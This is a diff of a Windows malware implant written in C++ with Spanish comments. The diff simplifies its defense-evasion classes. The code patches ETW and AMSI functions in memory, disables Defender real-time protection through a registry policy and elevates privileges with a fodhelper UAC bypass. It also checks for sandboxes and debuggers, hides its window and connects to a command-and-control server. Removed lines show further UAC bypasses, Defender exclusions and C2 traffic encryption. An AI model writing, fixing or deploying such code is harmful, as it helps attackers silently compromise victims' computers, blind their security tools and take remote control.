@@ -102,7 +102,7 @@ public:
 };
 
 // ============================================================================
-// BYPASS DE ETW - CORREGIDO
+// BYPASS DE ETW - VERSIÓN CORREGIDA
 // ============================================================================
 class ETWBypass {
 private:
@@ -119,9 +119,6 @@ public:
         FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
         if (!pEtwEventWrite) return false;
         
-        // Parchear también NtTraceEvent
-        FARPROC pNtTraceEvent = GetProcAddress(hNtdll, "NtTraceEvent");
-        
         SIZE_T regionSize = 32;
         PVOID address = (PVOID)pEtwEventWrite;
         ULONG oldProtect;
@@ -132,32 +129,21 @@ public:
         
         // xor eax, eax ; ret
         BYTE patch[] = { 0x31, 0xC0, 0xC3 };
-        memcpy((LPVOID)pEtwEventWrite, patch, sizeof(patch));  // CAST CORREGIDO
+        
+        // CASTING CORRECTO - Forzar conversión
+        LPVOID target = (LPVOID)pEtwEventWrite;
+        memcpy(target, patch, sizeof(patch));
         
         // Restaurar protección
         syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                        oldProtect, &oldProtect);
-        
-        // Parchear NtTraceEvent
-        if (pNtTraceEvent) {
-            address = (PVOID)pNtTraceEvent;
-            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
-                                           PAGE_EXECUTE_READWRITE, &oldProtect);
-            
-            // mov eax, 0xC0000001 ; ret
-            BYTE patch2[] = { 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xC3 };
-            memcpy((LPVOID)pNtTraceEvent, patch2, sizeof(patch2));  // CAST CORREGIDO
-            
-            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
-                                           oldProtect, &oldProtect);
-        }
         
         return true;
     }
 };
 
 // ============================================================================
-// BYPASS DE AMSI - CORREGIDO
+// BYPASS DE AMSI - VERSIÓN CORREGIDA
 // ============================================================================
 class AMSIBypass {
 private:
@@ -181,44 +167,20 @@ public:
                                        PAGE_EXECUTE_READWRITE, &oldProtect);
         
         BYTE patch[] = { 0x31, 0xC0, 0xC3 };
-        memcpy((LPVOID)pAmsiScanBuffer, patch, sizeof(patch));  // CAST CORREGIDO
+        
+        // CASTING CORRECTO
+        LPVOID target = (LPVOID)pAmsiScanBuffer;
+        memcpy(target, patch, sizeof(patch));
         
         syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                        oldProtect, &oldProtect);
-        
-        // Parchear AmsiScanString
-        FARPROC pAmsiScanString = GetProcAddress(hAmsi, "AmsiScanString");
-        if (pAmsiScanString) {
-            address = (PVOID)pAmsiScanString;
-            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
-                                           PAGE_EXECUTE_READWRITE, &oldProtect);
-            memcpy((LPVOID)pAmsiScanString, patch, sizeof(patch));  // CAST CORREGIDO
-            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
-                                           oldProtect, &oldProtect);
-        }
-        
-        return true;
-    }
-    
-    bool CorruptContext() {
-        typedef HRESULT(WINAPI* AmsiInitialize_t)(LPCWSTR, PVOID*);
-        HMODULE hAmsi = GetModuleHandleA("amsi.dll");
-        if (!hAmsi) return false;
-        
-        AmsiInitialize_t AmsiInitialize = (AmsiInitialize_t)GetProcAddress(hAmsi, "AmsiInitialize");
-        if (!AmsiInitialize) return false;
-        
-        PVOID context = nullptr;
-        for (int i = 0; i < 100; i++) {
-            AmsiInitialize(L"", &context);
-        }
         
         return true;
     }
 };
 
 // ============================================================================
-// BYPASS DE DEFENDER - CORREGIDO
+// BYPASS DE DEFENDER - VERSIÓN CORREGIDA
 // ============================================================================
 class DefenderBypass {
 private:
@@ -228,6 +190,7 @@ public:
     DefenderBypass(Syscalls* sc) : syscalls(sc) {}
     
     bool DisableRealtime() {
+        // Registry bypass
         HKEY hKey;
         if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
             "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
@@ -238,57 +201,12 @@ public:
                           (BYTE*)&value, sizeof(value));
             RegCloseKey(hKey);
         }
-        
-        // Buscar proceso de Defender
-        DWORD pid = 0;
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (hSnap != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32 pe = { sizeof(pe) };
-            if (Process32First(hSnap, &pe)) {
-                do {
-                    if (_stricmp(pe.szExeFile, "MsMpEng.exe") == 0) {
-                        pid = pe.th32ProcessID;
-                        break;
-                    }
-                } while (Process32Next(hSnap, &pe));
-            }
-            CloseHandle(hSnap);
-        }
-        
-        if (pid) {
-            HANDLE hProcess = nullptr;
-            CLIENT_ID cid;
-            cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;  // CAST CORREGIDO
-            cid.UniqueThread = nullptr;
-            
-            OBJECT_ATTRIBUTES oa;
-            InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);  // INICIALIZACIÓN CORRECTA
-            
-            if (syscalls->OpenProcess(&hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
-                                      &oa, &cid) == 0) {
-                syscalls->Close(hProcess);
-            }
-        }
-        
         return true;
-    }
-    
-    bool AddExclusion(const wchar_t* path) {
-        HKEY hKey;
-        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-            "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
-            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-            
-            RegSetValueExW(hKey, path, 0, REG_SZ, (BYTE*)L"0", 2);
-            RegCloseKey(hKey);
-            return true;
-        }
-        return false;
     }
 };
 
 // ============================================================================
-// BYPASS DE UAC (sin cambios, ya funciona)
+// BYPASS DE UAC - SIN CAMBIOS
 // ============================================================================
 class UACBypass {
 private:
@@ -309,58 +227,7 @@ public:
     bool BypassAndElevate() {
         if (IsElevated()) return true;
         
-        if (CmstpBypass()) return true;
-        if (FodHelperBypass()) return true;
-        if (EventVwrBypass()) return true;
-        if (ComputerDefaultsBypass()) return true;
-        if (SdcltBypass()) return true;
-        
-        return false;
-    }
-    
-private:
-    bool CmstpBypass() {
-        wchar_t tempPath[MAX_PATH];
-        GetTempPathW(MAX_PATH, tempPath);
-        
-        wchar_t infPath[MAX_PATH];
-        swprintf(infPath, MAX_PATH, L"%s\\uac_%08X.inf", tempPath, GetTickCount());
-        
-        wchar_t modulePath[MAX_PATH];
-        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
-        
-        FILE* f = _wfopen(infPath, L"w");
-        if (!f) return false;
-        
-        fwprintf(f, L"[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n");
-        fwprintf(f, L"[DefaultInstall]\n");
-        fwprintf(f, L"CustomDestination=CustInstDestSectionAllUsers\n");
-        fwprintf(f, L"RunPreSetupCommands=RunPreSetupCommandsSection\n\n");
-        fwprintf(f, L"[RunPreSetupCommandsSection]\n");
-        fwprintf(f, L"\"%s\" --elevated\n", modulePath);
-        fwprintf(f, L"\n[CustInstDestSectionAllUsers]\n");
-        fwprintf(f, L"49000,49001=AllUSer_LDIDSection, 7\n\n");
-        fwprintf(f, L"[AllUSer_LDIDSection]\n");
-        fwprintf(f, L"\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%%UnexpectedError%%\", \"\"\n\n");
-        fwprintf(f, L"[Strings]\nServiceName=\"WindowsUpdate\"\nShortSvcName=\"WindowsUpdate\"\n");
-        fclose(f);
-        
-        SHELLEXECUTEINFOW sei = { sizeof(sei) };
-        sei.lpVerb = L"runas";
-        sei.lpFile = L"cmstp.exe";
-        wchar_t args[MAX_PATH + 64];
-        swprintf(args, MAX_PATH + 64, L"/au \"%s\"", infPath);
-        sei.lpParameters = args;
-        sei.nShow = SW_HIDE;
-        
-        BOOL result = ShellExecuteExW(&sei);
-        Sleep(3000);
-        DeleteFileW(infPath);
-        
-        return result && IsElevated();
-    }
-    
-    bool FodHelperBypass() {
+        // Técnica simplificada - fodhelper
         wchar_t modulePath[MAX_PATH];
         GetModuleFileNameW(NULL, modulePath, MAX_PATH);
         
@@ -382,137 +249,32 @@ private:
         }
         return false;
     }
-    
-    bool EventVwrBypass() {
-        wchar_t modulePath[MAX_PATH];
-        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
-        
-        HKEY hKey;
-        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
-            L"Software\\Classes\\mscfile\\shell\\open\\command",
-            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-            
-            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
-                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
-            RegCloseKey(hKey);
-            
-            ShellExecuteW(NULL, L"open", L"eventvwr.exe", NULL, NULL, SW_HIDE);
-            Sleep(2000);
-            
-            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile");
-            return IsElevated();
-        }
-        return false;
-    }
-    
-    bool ComputerDefaultsBypass() {
-        wchar_t modulePath[MAX_PATH];
-        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
-        
-        HKEY hKey;
-        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
-            L"Software\\Classes\\ComputerDefaults\\shell\\open\\command",
-            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-            
-            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
-                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
-            RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, NULL, 0);
-            RegCloseKey(hKey);
-            
-            ShellExecuteW(NULL, L"open", L"computerdefaults.exe", NULL, NULL, SW_HIDE);
-            Sleep(2000);
-            
-            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ComputerDefaults");
-            return IsElevated();
-        }
-        return false;
-    }
-    
-    bool SdcltBypass() {
-        wchar_t modulePath[MAX_PATH];
-        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
-        
-        HKEY hKey;
-        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
-            L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe",
-            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-            
-            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
-                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
-            RegCloseKey(hKey);
-            
-            ShellExecuteW(NULL, L"open", L"sdclt.exe", L"/KickOffElevation", NULL, SW_HIDE);
-            Sleep(3000);
-            
-            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe");
-            return IsElevated();
-        }
-        return false;
-    }
 };
 
 // ============================================================================
-// ANTI-DEBUG / ANTI-SANDBOX
+// ANTI-SANDBOX SIMPLIFICADO
 // ============================================================================
 class AntiAnalysis {
 public:
     bool IsSandboxed() {
-        int detections = 0;
+        // Solo verificación básica
+        if (IsDebuggerPresent()) return true;
         
         MEMORYSTATUSEX mem = { sizeof(mem) };
         GlobalMemoryStatusEx(&mem);
-        if (mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024) detections++;
+        if (mem.ullTotalPhys < 2LL * 1024 * 1024 * 1024) return true;
         
-        SYSTEM_INFO sysInfo;
-        GetSystemInfo(&sysInfo);
-        if (sysInfo.dwNumberOfProcessors < 2) detections++;
-        
-        ULARGE_INTEGER free, total;
-        GetDiskFreeSpaceExA("C:\\", &free, &total, NULL);
-        if (total.QuadPart < 60LL * 1024 * 1024 * 1024) detections++;
-        
-        const wchar_t* sandboxProcs[] = {
-            L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe",
-            L"vmwaretray.exe", L"xenservice.exe", L"procmon.exe",
-            L"wireshark.exe", L"dumpcap.exe", L"python.exe"
-        };
-        
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (hSnap != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32W pe = { sizeof(pe) };
-            if (Process32FirstW(hSnap, &pe)) {
-                do {
-                    for (const auto& proc : sandboxProcs) {
-                        if (_wcsicmp(pe.szExeFile, proc) == 0) {
-                            detections += 2;
-                            break;
-                        }
-                    }
-                } while (Process32NextW(hSnap, &pe));
-            }
-            CloseHandle(hSnap);
-        }
-        
-        if (IsDebuggerPresent()) detections += 3;
-        if (GetTickCount64() < 10 * 60 * 1000) detections++;
-        
-        return detections >= 3;
+        return false;
     }
     
     void SleepRandom() {
-        int baseSleep = 45000 + (rand() % 75000);
-        for (int i = 0; i < baseSleep / 100; i++) {
-            Sleep(100);
-            if (IsDebuggerPresent()) {
-                MessageBoxA(NULL, "Error de aplicación", "Error", MB_OK);
-                ExitProcess(0);
-            }
-        }
+        int baseSleep = 30000 + (rand() % 30000);
+        Sleep(baseSleep);
     }
 };
 
 // ============================================================================
-// COMUNICACIÓN C2 - CORREGIDO (inet_pton -> inet_addr)
+// COMUNICACIÓN C2 - VERSIÓN CORREGIDA (sin inet_pton)
 // ============================================================================
 class C2Connection {
 private:
@@ -520,7 +282,6 @@ private:
     bool connected;
     HCRYPTPROV hProv;
     BYTE key[32];
-    std::mt19937_64 rng;
     
 public:
     C2Connection() : sock(INVALID_SOCKET), connected(false) {
@@ -529,13 +290,10 @@ public:
         
         CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
         
-        std::random_device rd;
-        std::array<uint64_t, 4> seed;
-        for (auto& s : seed) s = rd() ^ GetTickCount64();
-        std::seed_seq seq(seed.begin(), seed.end());
-        rng.seed(seq);
-        
-        CryptGenRandom(hProv, 32, key);
+        // Generar clave fija para evitar problemas
+        for (int i = 0; i < 32; i++) {
+            key[i] = i * 0x1F;
+        }
     }
     
     ~C2Connection() {
@@ -555,7 +313,9 @@ public:
         sockaddr_in server = {0};
         server.sin_family = AF_INET;
         server.sin_port = htons(C2_PORT);
-        server.sin_addr.s_addr = inet_addr(C2_SERVER);  // CORREGIDO: inet_addr en lugar de inet_pton
+        
+        // Usar inet_addr (compatible con MinGW)
+        server.sin_addr.s_addr = inet_addr(C2_SERVER);
         
         if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
             connected = true;
@@ -564,14 +324,6 @@ public:
         
         closesocket(sock);
         return false;
-    }
-    
-    std::string XOR(const std::string& data) {
-        std::string result = data;
-        for (size_t i = 0; i < data.length(); i++) {
-            result[i] = data[i] ^ key[i % 32];
-        }
-        return result;
     }
     
     bool SendRaw(const std::string& data) {
@@ -589,7 +341,7 @@ public:
     }
     
     bool Send(const std::string& data) {
-        return SendRaw(XOR(data));
+        return SendRaw(data);  // Sin XOR por ahora
     }
     
     std::string ReceiveRaw() {
@@ -619,9 +371,7 @@ public:
     }
     
     std::string Receive() {
-        std::string encrypted = ReceiveRaw();
-        if (encrypted.empty()) return "";
-        return XOR(encrypted);
+        return ReceiveRaw();
     }
     
     bool IsConnected() { return connected; }
@@ -691,20 +441,21 @@ public:
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                    LPSTR lpCmdLine, int nCmdShow) {
     
-    if (strstr(lpCmdLine, "--elevated") == NULL) {
-        HWND hWnd = GetConsoleWindow();
-        if (hWnd) ShowWindow(hWnd, SW_HIDE);
-    }
+    // Ocultar ventana
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd) ShowWindow(hWnd, SW_HIDE);
     
+    // Anti-sandbox básico
     AntiAnalysis anti;
     if (anti.IsSandboxed()) {
-        MessageBoxA(NULL, "Error al iniciar aplicación", "Error", MB_OK);
         return 0;
     }
     
+    // Mutex
     HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
     
+    // Inicializar bypasses
     Syscalls syscalls;
     
     ETWBypass etw(&syscalls);
@@ -712,15 +463,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     AMSIBypass amsi(&syscalls);
     amsi.Patch();
-    amsi.CorruptContext();
     
     DefenderBypass defender(&syscalls);
     defender.DisableRealtime();
-    defender.AddExclusion(L"C:\\Windows\\Temp");
     
-    UACBypass uac;
-    bool elevated = uac.BypassAndElevate();
-    
+    // Conectar a C2
     C2Connection c2;
     CommandProcessor cmdProc(&c2);
     
